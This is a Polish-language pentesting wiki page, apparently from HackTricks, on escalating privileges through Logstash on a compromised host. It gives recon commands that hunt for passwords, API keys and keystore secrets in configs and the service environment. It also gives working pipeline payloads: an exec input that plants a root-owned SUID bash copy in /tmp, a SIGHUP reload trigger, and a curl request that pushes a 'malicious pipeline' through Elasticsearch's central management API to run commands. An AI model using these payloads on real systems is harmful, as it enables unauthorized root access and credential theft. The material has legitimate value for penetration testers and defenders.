# Podnoszenie uprawnień przez Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash służy do **gromadzenia, przekształcania i przekazywania logów** w systemie znanym jako **pipelines**. Składają się one z etapów **input**, **filter** i **output**.<sup>[[4]](#references)</sup> Ciekawy aspekt pojawia się, gdy Logstash działa na przejętej maszynie.

### Konfiguracja pipeline

W przypadku instalacji pakietów Debian i RPM konfigurację pipelines określa plik **/etc/logstash/pipelines.yml**, który zawiera lokalizacje konfiguracji pipeline; w innych dystrybucjach plik `pipelines.yml` znajduje się w katalogu `path.settings` Logstash.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Ten plik ujawnia lokalizację plików **.conf** zawierających konfiguracje pipeline’ów. Jeśli używane jest wyjście **Elasticsearch**, sprawdź ustawienia `user`/`password`, `cloud_auth` lub `api_key`; efektywne uprawnienia konta zależą od Elasticsearch. Wzorzec `path.config` wczytuje każdy pasujący plik dla danego pipeline’u.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Jeśli Logstash jest uruchamiany z `-f <directory>` zamiast `pipelines.yml`, opcja `-f` ma pierwszeństwo, a **wszystkie pliki w tym katalogu są łączone w kolejności leksykograficznej i analizowane jako pojedyncza konfiguracja**.<sup>[[6]](#references)[[7]](#references)</sup> Ma to 2 konsekwencje z punktu widzenia atakującego:

- Dodany plik, taki jak `000-input.conf` lub `zzz-output.conf`, może zmienić sposób składania końcowego pipeline’u
- Niepoprawny plik może spowodować, że połączona konfiguracja nie przejdzie walidacji; podczas ponownego wczytywania Logstash zachowuje poprzedni pipeline, dlatego przed poleganiem na automatycznym ponownym wczytywaniu należy zwalidować payloady.<sup>[[1]](#references)</sup>

### Szybkie rozpoznanie na przejętym hoście

Na maszynie z zainstalowanym Logstash szybko sprawdź:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Sprawdź również, czy lokalne API monitorowania jest osiągalne. Domyślnie nasłuchuje na **127.0.0.1:9600**, co zwykle wystarcza po uzyskaniu dostępu do hosta.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Te endpointy ujawniają identyfikatory i ustawienia pipeline’ów, metryki środowiska uruchomieniowego oraz liczniki powodzeń i niepowodzeń przeładowania konfiguracji, co pomaga potwierdzić, czy zmiana została zaakceptowana.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Jeśli odzyskane dane uwierzytelniające dotyczą **Elasticsearch**, sprawdź [tę stronę o Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### File input przekazujący dane do dynamicznego command output

Konfiguracja pipeline’u może być tylko do odczytu dla bieżącego użytkownika, a jednocześnie jego [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) może monitorować ścieżkę, w której użytkownik może zapisywać. Prześledź załadowany pipeline od tego wejścia przez ewentualne [przechwytywanie pól Grok](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) aż do [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Exec output przekazuje swoje `command` przez powłokę i podstawia wartości `%{field}` bez oczyszczania metaznaków powłoki. Zapisywalna ścieżka wejściowa stanowi potencjalną drogę do uzyskania wyższych uprawnień tylko wtedy, gdy działająca usługa ma wyższe uprawnienia, plik użytkownika może faktycznie trafić do monitorowanego wejścia, filtry i warunki wyjściowe kierują jego zawartość do pola command, a ten output plugin jest zainstalowany i aktywny. Osobno sprawdź uprawnienia do przeszukiwania i zapisu katalogu, stan śledzenia file input oraz efektywne konto usługi; podczas pasywnego rozpoznania nie zapisuj testowego zdarzenia ani nie wywołuj output.

### Eskalacja uprawnień przez zapisywalne pipeline’y

Aby spróbować eskalacji uprawnień, najpierw ustal, jako jaki użytkownik faktycznie działa usługa Logstash; nie zakładaj, że jest to root lub użytkownik **logstash**. Upewnij się, że spełniasz **jedno** z poniższych kryteriów:

- Masz **uprawnienia do zapisu** do pliku pipeline’u **.conf** **lub**
- Plik **/etc/logstash/pipelines.yml** używa symbolu wieloznacznego, a Ty możesz zapisywać w docelowym folderze.<sup>[[6]](#references)[[7]](#references)</sup>

Dodatkowo musi być spełniony **jeden** z poniższych warunków:

- Możliwość ponownego uruchomienia usługi Logstash **lub**
- W pliku **/etc/logstash/logstash.yml** ustawiono **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Jeśli konfiguracja zawiera symbol wieloznaczny, utworzenie pliku pasującego do tego symbolu umożliwia wykonanie polecenia.<sup>[[7]](#references)[[9]](#references)</sup> Na przykład:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Tutaj **interval** określa częstotliwość wykonywania w sekundach. W podanym przykładzie polecenie **whoami** uruchamia się co 120 sekund, a jego wynik jest zapisywany w pliku **/tmp/output.log**.<sup>[[9]](#references)</sup>

Po ustawieniu **config.reload.automatic: true** w pliku **/etc/logstash/logstash.yml** Logstash będzie automatycznie wykrywać i stosować nowe lub zmodyfikowane konfiguracje pipeline bez konieczności ponownego uruchamiania.<sup>[[1]](#references)[[15]](#references)</sup> Jeśli nie użyto symbolu wieloznacznego, nadal można modyfikować istniejące konfiguracje, ale należy zachować ostrożność, aby uniknąć zakłóceń.

### Bardziej niezawodne payloady pipeline

Plugin wejściowy `exec` nadal działa w bieżących wydaniach i wymaga ustawienia `interval` lub `schedule`. Uruchamia się poprzez **forking** maszyny JVM Logstash, więc jeśli brakuje pamięci, payload może zakończyć się błędem `ENOMEM` zamiast po cichu działać.<sup>[[9]](#references)</sup>

Gdy usługa ma wystarczające uprawnienia, aby utworzyć plik SUID należący do roota, praktycznym payloadem do eskalacji uprawnień jest taki, który pozostawia trwały artefakt:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Jeśli nie masz uprawnień do ponownego uruchomienia, ale możesz wysłać sygnał do procesu, Logstash obsługuje również przeładowanie wyzwalane sygnałem **SIGHUP** w systemach uniksopodobnych:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Pamiętaj, że nie każda wtyczka obsługuje przeładowywanie. Na przykład wejście **stdin** uniemożliwia automatyczne przeładowywanie, więc nie zakładaj, że `config.reload.automatic` zawsze uwzględni wprowadzone zmiany.<sup>[[1]](#references)</sup>

### Wykradanie sekretów z Logstash

Zanim skupisz się wyłącznie na wykonywaniu kodu, zbierz dane, do których Logstash ma już dostęp:

- Dane uwierzytelniające mogą znajdować się w wyjściach `elasticsearch {}`, adresach URL lub ustawieniach `http_poller`, wejściach JDBC albo ustawieniach związanych z chmurą; te wtyczki udostępniają pola z danymi uwierzytelniającymi, których warto szukać.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Ustawienia zabezpieczeń mogą znajdować się w **`/etc/logstash/logstash.keystore`** lub innym katalogu `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Hasło do keystore może być przekazywane przez **`LOGSTASH_KEYSTORE_PASS`**, a instalacje RPM/DEB wczytują zmienne środowiskowe usługi z **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Rozwinięcie zmiennych środowiskowych za pomocą `${VAR}` następuje podczas uruchamiania Logstash, dlatego warto sprawdzić środowisko usługi.<sup>[[14]](#references)</sup>

Przydatne kontrole:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Warto to również sprawdzić, ponieważ **CVE-2023-46672** wykazało, że w określonych okolicznościach Logstash zapisywał w logach poufne informacje, w tym sekrety przechowywane w jego keystore i wskazane w konfiguracji; jeśli te okoliczności mogły wystąpić, przejrzyj stare logi Logstash i wpisy `journald`.<sup>[[3]](#references)</sup>

### Nadużycie scentralizowanego zarządzania pipeline'ami

W niektórych środowiskach host w ogóle **nie korzysta** z lokalnych plików `.conf`. Jeśli skonfigurowano **`xpack.management.enabled: true`**, Logstash może pobierać pipeline'y zarządzane centralnie z Elasticsearch/Kibana, a po włączeniu tego trybu lokalne konfiguracje pipeline'ów przestają być źródłem prawdy.<sup>[[2]](#references)</sup>

Oznacza to inną ścieżkę ataku:

1. Odzyskaj dane uwierzytelniające Elastic z lokalnych ustawień Logstash, keystore lub logów.<sup>[[3]](#references)[[10]](#references)</sup>
2. Sprawdź, czy konto ma uprawnienie klastra **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Utwórz lub zastąp centralnie zarządzany pipeline, aby host Logstash uruchomił Twój payload podczas następnego cyklu odpytywania.<sup>[[2]](#references)[[16]](#references)</sup>

Interfejs API Elasticsearch używany w tej funkcji to:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Jest to szczególnie przydatne, gdy lokalne pliki są tylko do odczytu, a Logstash jest już skonfigurowany do zdalnego pobierania pipeline'ów.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Ponowne wczytywanie pliku konfiguracyjnego](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Konfigurowanie scentralizowanego zarządzania pipeline'ami](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Aktualizacja zabezpieczeń Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Tworzenie pipeline'u Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Układ katalogów Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Wiele pipeline'ów](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Uruchamianie Logstash z wiersza poleceń](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitorowanie Logstash za pomocą API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin wejściowy Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Magazyn kluczy Secrets do ustawień bezpiecznych](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin wyjściowy Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin wejściowy Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin wejściowy Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Korzystanie ze zmiennych środowiskowych](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Tworzenie lub aktualizowanie pipeline'u Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pobieranie ustawień pipeline'ów](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pobieranie statystyk pipeline'ów](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
